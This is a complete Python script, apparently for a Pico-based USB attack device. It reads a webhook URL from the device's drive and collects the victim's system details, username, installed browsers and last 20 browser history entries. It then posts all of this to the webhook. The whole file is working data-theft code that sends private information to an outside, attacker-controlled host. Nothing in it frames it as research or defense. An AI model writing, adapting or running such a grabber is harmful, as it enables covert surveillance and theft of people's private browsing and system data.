import os
import json
import requests
import platform
import getpass
import psutil
from datetime import datetime
from browser_history import get_history

PICO_DRIVE = 'D:\\'
WEBHOOK_FILE = os.path.join(PICO_DRIVE, 'webhook.txt')


def get_webhook_url():
    try:
        with open(WEBHOOK_FILE, 'r') as f:
            return f.read().strip()
    except Exception:
        print("[ERROR] Could not find webhook URL from Pico")
        return None


def get_system_info():
    return {
        'OS': platform.system(),
        'OS Version': platform.version(),
        'Platform': platform.platform(),
        'Machine': platform.machine(),
        'Processor': platform.processor(),
        'RAM': f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB",
        'User': getpass.getuser()
    }


def get_browser_history():
    try:
        outputs = get_history()
        entries = outputs.histories[-20:]  # Last 20 entries
        return [{'url': url, 'timestamp': dt.strftime('%Y-%m-%d %H:%M:%S')} for dt, url in entries]
    except Exception as e:
        return [{"error": str(e)}]


def detect_installed_browsers():
    known_browsers = {
        "chrome": os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data"),
        "edge": os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data"),
        "brave": os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data"),
        "opera": os.path.expandvars(r"%APPDATA%\Opera Software\Opera Stable"),
        "firefox": os.path.expandvars(r"%APPDATA%\Mozilla\Firefox\Profiles")
    }
    detected = {}
    for name, path in known_browsers.items():
        if os.path.exists(path):
            detected[name] = path
    return detected


def send_to_webhook(webhook_url, system_data, browsers, browser_data):
    content = f"""**🖥 System Info**  
> OS: {system_data['OS']} {system_data['OS Version']}  
> Platform: {system_data['Platform']}  
> Machine: {system_data['Machine']}  
> Processor: {system_data['Processor']}  
> RAM: {system_data['RAM']}  
> User: {system_data['User']}

**🌐 Browsers Detected**: {len(browsers)}  
{', '.join(browsers.keys())}

**🕘 Browser History (last 20 entries)**:"""

    for entry in browser_data:
        if 'url' in entry:
            content += f"\n> {entry['timestamp']} - {entry['url']}"
        else:
            content += f"\n> Error: {entry['error']}"

    requests.post(webhook_url, json={'content': content})


def main():
    webhook_url = get_webhook_url()
    if not webhook_url:
        return

    system_data = get_system_info()
    browsers = detect_installed_browsers()
    browser_history = get_browser_history()

    send_to_webhook(webhook_url, system_data, browsers, browser_history)


if __name__ == '__main__':
    main()